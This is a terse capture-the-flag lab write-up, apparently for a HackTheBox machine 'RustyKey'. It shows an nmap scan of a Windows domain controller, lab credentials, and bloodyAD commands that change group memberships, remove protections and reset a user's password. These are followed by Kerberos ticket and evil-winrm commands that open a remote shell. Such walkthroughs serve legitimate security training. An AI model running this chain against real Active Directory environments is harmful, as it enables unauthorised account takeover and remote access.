
# Summary


---

10.10.11.75
rr.parker : 8#t5HE8L!W3A

we will start with nmap:
```
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-10-09 20:57:04Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

The `NTLM` authentication is disabled. We need to use kerberos.

IT-COMPUTER3 : Rusty88!





```
bloodyAD -d rustykey.htb --host dc.rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' -k add groupMember 'HELPDESK' 'IT-Computer3$'
bloodyAD -d rustykey.htb --host dc.rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' -k remove groupMember 'Protected Objects' 'IT'
bloodyAD -d rustykey.htb --host dc.rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' -k remove groupMember 'Protected Objects' 'SUPPORT'
bloodyAD -d rustykey.htb --host dc.rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' -k set password 'bb.morgan' 'P@ssw0rd1!'
getTGT.py -dc-ip 10.10.11.75 'rustykey.htb/bb.morgan:P@ssw0rd1!'
evil-winrm -i dc.rustykey.htb -k bb.morgan.ccache  -r rustykey.htb
```